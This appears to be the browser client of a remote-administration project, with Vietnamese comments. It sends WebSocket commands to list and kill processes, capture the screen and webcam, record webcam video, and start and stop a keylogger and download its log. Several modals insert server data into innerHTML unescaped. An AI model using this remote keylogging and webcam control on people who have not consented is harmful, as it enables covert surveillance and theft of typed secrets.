// ==========================================
// 1. KHỞI TẠO BIẾN VÀ LẤY DOM ELEMENTS
// ==========================================
let socket = null;

// Views & Status (Giữ nguyên)
const loginView = document.getElementById("login-view");
const controlView = document.getElementById("control-view");
const ipInput = document.getElementById("server-ip");
const portInput = document.getElementById("server-port");
const connectButton = document.getElementById("btn-connect");
const disconnectButton = document.getElementById("btn-disconnect");
const loginStatusText = document.getElementById("login-status-text");
const loginStatusLight = document.getElementById("login-status-light");
const controlStatusText = document.getElementById("control-status-text");
const controlStatusLight = document.getElementById("control-status-light");

// Modal Elements (Giữ nguyên)
const resultModal = document.getElementById("result-modal");
const modalTitle = document.getElementById("modal-title");
const modalBody = document.getElementById("modal-body");
const closeModal = document.getElementById("close-modal");
const modalFooter = document.getElementById("modal-footer");
const downloadLink = document.getElementById("download-link");

// ==========================================
// 2. HÀM XỬ LÝ GIAO DIỆN (UI) - (Giữ nguyên)
// ==========================================
function showControlView() {
    loginView.classList.add("hidden");
    controlView.classList.remove("hidden");
    controlStatusText.innerText = "Đã kết nối";
    controlStatusLight.className = "connected";
}

function showLoginView(message, isError = false) {
    loginView.classList.remove("hidden");
    controlView.classList.add("hidden");
    resultModal.classList.add("hidden");
    loginStatusText.innerText = message;
    loginStatusLight.className = "disconnected";
    connectButton.disabled = false;
    connectButton.innerText = "Kết nối";
}

closeModal.onclick = () => { resultModal.classList.add("hidden"); };
window.onclick = (event) => { if (event.target == resultModal) resultModal.classList.add("hidden"); };

// ==========================================
// 3. HÀM KẾT NỐI WEBSOCKET - (Giữ nguyên)
// ==========================================
function connect() {
    const ip = ipInput.value;
    const port = portInput.value;
    if (!ip || !port) return alert("Vui lòng nhập IP và Port.");

    connectButton.disabled = true;
    connectButton.innerText = "Đang kết nối...";
    loginStatusText.innerText = "Đang thử kết nối...";

    const serverUrl = `ws://${ip}:${port}`;
    console.log(`Connecting to: ${serverUrl}`);
    
    try { socket = new WebSocket(serverUrl); } catch (e) {
        console.error("Lỗi tạo WS:", e); showLoginView("Địa chỉ lỗi", true); return;
    }

    socket.onopen = () => { console.log("WS Connected"); showControlView(); };
    socket.onclose = () => { console.log("WS Closed"); showLoginView("Đã ngắt kết nối"); socket = null; };
    socket.onerror = (err) => { console.error("WS Error", err); showLoginView("Lỗi kết nối", true); socket = null; };
    socket.onmessage = (event) => {
        console.log(`[RECEIVED]: ${event.data}`);
        try {
            if (!event.data) return;
            const data = JSON.parse(event.data);
            handleServerResponse(data);
        } catch (e) { console.warn("Non-JSON received:", event.data); }
    };
}

// ==========================================
// 4. HÀM GỬI LỆNH (CLIENT -> SERVER) - (Giữ nguyên)
// ==========================================
function sendSocketMessage(command, payload = null) {
    if (socket && socket.readyState === WebSocket.OPEN) {
        const message = JSON.stringify({ command: command, payload: payload });
        socket.send(message);
        console.log(`[SENT]: ${message}`);
    } else {
        alert("Mất kết nối tới server!");
        showLoginView("Mất kết nối", true);
    }
}

// ==========================================
// 5. HÀM XỬ LÝ PHẢN HỒI (SERVER -> CLIENT) - (CẬP NHẬT)
// ==========================================
function handleServerResponse(data) {
    const cmd = data.command;
    const payload = data.payload;
    const ip = ipInput.value;
    const port = portInput.value;
    const httpBaseUrl = `http://${ip}:${port}`;

    switch (cmd) {
        // --- CÁC CASE CŨ ---
        case "list_apps": showTableModal("Danh sách Apps", payload); break;
        case "list_processes": showTableModal("Danh sách Processes", payload); break;
        case "screen_capture": showImageModal("Ảnh chụp màn hình", httpBaseUrl + payload); break;
        // case "screen_record": (Đã bị xóa theo yêu cầu)

        // --- CÁC CASE MỚI ---
        case "webcam_capture":
            // Payload mong đợi: "/captures/webcam_xxx.png"
            showImageModal("Ảnh chụp Webcam", httpBaseUrl + payload);
            break;

        case "webcam_record":
            // Payload mong đợi: "/captures/webcam_video_xxx.mp4"
            showVideoModal("Video quay Webcam", httpBaseUrl + payload);
            break;

        case "keylogger_log":
            // Payload mong đợi: Chuỗi text chứa log phím
            showLogModal("Nhật ký bàn phím (Keylogger)", payload);
            break;

        case "error": showModal("Lỗi", `<p style="color:red;">${payload}</p>`); break;
        default: console.log("Unhandled command:", data); break;
    }
}

// ==========================================
// 6. CÁC HÀM HIỂN THỊ MODAL - (CẬP NHẬT THÊM showLogModal)
// ==========================================
function showModal(title, htmlContent) {
    modalTitle.innerText = title;
    modalBody.innerHTML = htmlContent;
    modalFooter.classList.add("hidden");
    resultModal.classList.remove("hidden");
}

function showTableModal(title, listData) {
    if (!Array.isArray(listData) || listData.length === 0) {
        showModal(title, "<p>Danh sách trống.</p>"); return;
    }
    let html = '<table class="result-table"><thead><tr>';
    const firstRow = listData[0];
    if (typeof firstRow === 'object' && firstRow !== null) {
        const headers = Object.keys(firstRow);
        headers.forEach(h => html += `<th>${h.toUpperCase()}</th>`);
        html += '</tr></thead><tbody>';
        listData.forEach(row => {
            html += '<tr>'; headers.forEach(key => html += `<td>${row[key]}</td>`); html += '</tr>';
        });
    } else {
        html += '<th>VALUE</th></tr></thead><tbody>';
        listData.forEach(row => html += `<tr><td>${row}</td></tr>`);
    }
    html += '</tbody></table>';
    showModal(title, html);
}

function showImageModal(title, url) {
    const html = `<img src="${url}" class="screenshot-img" alt="Image" onerror="this.src='';this.alt='Lỗi tải ảnh';">`;
    showModal(title, html);
    setupDownloadLink(url, `image_${Date.now()}.png`);
}

function showVideoModal(title, url) {
    const html = `<div style="text-align:center"><video controls autoplay style="max-height:60vh;max-width:100%"><source src="${url}" type="video/mp4">Trình duyệt không hỗ trợ.</video></div>`;
    showModal(title, html);
    setupDownloadLink(url, `video_${Date.now()}.mp4`);
}

// HÀM MỚI: Hiển thị log text (cho Keylogger)
function showLogModal(title, logContent) {
    // Sử dụng thẻ <pre> để giữ nguyên định dạng xuống dòng của log
    const html = `<pre style="background:#f4f4f4; padding:15px; border-radius:5px; max-height:60vh; overflow:auto; white-space:pre-wrap;">${logContent || "Log trống."}</pre>`;
    showModal(title, html);
    // Tạo file text để tải xuống
    const blob = new Blob([logContent], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    setupDownloadLink(url, `keylog_${Date.now()}.txt`);
}

function setupDownloadLink(url, filename) {
    downloadLink.href = url;
    downloadLink.download = filename;
    modalFooter.classList.remove("hidden");
}

// ==========================================
// 7. GẮN SỰ KIỆN CHO CÁC NÚT - (CẬP NHẬT)
// ==========================================
connectButton.onclick = () => { if (!socket) connect(); };
disconnectButton.onclick = () => { if (socket) socket.close(); };

// Apps & Processes (Giữ nguyên)
document.getElementById("btn-list-apps").onclick = () => sendSocketMessage("list_apps");
document.getElementById("btn-start-app").onclick = () => { const n = document.getElementById("app-name-start").value; if(n) sendSocketMessage("start_app", {name:n}); };
document.getElementById("btn-stop-app").onclick = () => { const i = document.getElementById("app-pid-stop").value; if(i) sendSocketMessage("stop_app", {id:i}); };
document.getElementById("btn-list-process").onclick = () => sendSocketMessage("list_processes");
document.getElementById("btn-start-process").onclick = () => { const n = document.getElementById("process-name-start").value; if(n) sendSocketMessage("start_process", {name:n}); };
document.getElementById("btn-stop-process").onclick = () => { const i = document.getElementById("process-pid-stop").value; if(i) sendSocketMessage("stop_process", {id:i}); };

// --- MÀN HÌNH (Đã sửa: Chỉ còn nút chụp) ---
document.getElementById("btn-screen-capture").onclick = () => sendSocketMessage("screen_capture");

// --- WEBCAM (MỚI) ---
document.getElementById("btn-webcam-capture").onclick = () => sendSocketMessage("webcam_capture");
document.getElementById("btn-webcam-record").onclick = () => {
    const sec = parseInt(document.getElementById("webcam-duration").value);
    if(sec > 0) {
        sendSocketMessage("webcam_record", { duration: sec });
        alert(`Đang yêu cầu quay Webcam trong ${sec} giây...`);
    } else { alert("Thời gian phải > 0"); }
};

// --- KEYLOGGER (MỚI) ---
document.getElementById("btn-keylogger-start").onclick = () => {
    sendSocketMessage("keylogger_start");
    // Có thể đổi màu nút hoặc hiện thông báo nhỏ để biết đang ghi
    alert("Đã gửi lệnh bắt đầu ghi phím.");
};
document.getElementById("btn-keylogger-stop").onclick = () => {
    sendSocketMessage("keylogger_stop");
    alert("Đang dừng và lấy log...");
};

// Message & System (Giữ nguyên)
document.getElementById("btn-send-message").onclick = () => { const m = document.getElementById("message-text").value; if(m) sendSocketMessage("send_message", {text:m}); };
document.getElementById("btn-shutdown").onclick = () => { if(confirm("Chắc chắn TẮT Server?")) sendSocketMessage("shutdown"); };